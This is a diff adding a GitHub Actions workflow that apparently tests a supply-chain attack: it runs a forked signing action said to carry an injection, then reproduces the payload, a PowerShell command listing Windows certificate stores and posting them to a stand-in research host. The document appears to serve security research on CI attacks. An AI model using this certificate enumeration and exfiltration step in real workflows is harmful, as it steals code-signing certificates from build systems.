@@ -1,0 +1,32 @@
+name: "#13 syncthing — Windows PowerShell cert theft"
+on: workflow_dispatch
+
+jobs:
+  test-syncthing:
+    name: "syncthing — Windows cert theft"
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Run forked artifact-signing-action (injection enumerates cert stores)"
+        uses: rafidhaque/artifact-signing-action@4c86a364366bb97913dc47b5ff15bb8fbc75c53e
+        continue-on-error: true
+
+      - name: "Verify: PowerShell cert enumeration mechanism works"
+        shell: pwsh
+        run: |
+          Write-Host "=== Testing the same PowerShell command the payload uses ==="
+          $certs = Get-ChildItem -Path Cert:\CurrentUser\My, Cert:\LocalMachine\My -ErrorAction SilentlyContinue | Select-Object Subject, Thumbprint, NotAfter
+          if ($certs) {
+            Write-Host "SUCCESS: Found certificates in store"
+            $certs | ConvertTo-Json | Write-Host
+          } else {
+            Write-Host "No certs in store (expected on fresh runner — mechanism still works, just empty result)"
+          }
+          Write-Host ""
+          Write-Host "=== Exfil attempt (will fail on example.com) ==="
+          try {
+            $certs | ConvertTo-Json | Invoke-RestMethod -Uri "https://eaction-research.example.com/signing-certs" -Method Post -ContentType "application/json" -ErrorAction SilentlyContinue
+          } catch {
+            Write-Host "curl failed as expected (domain unresolvable): $_"
+          }
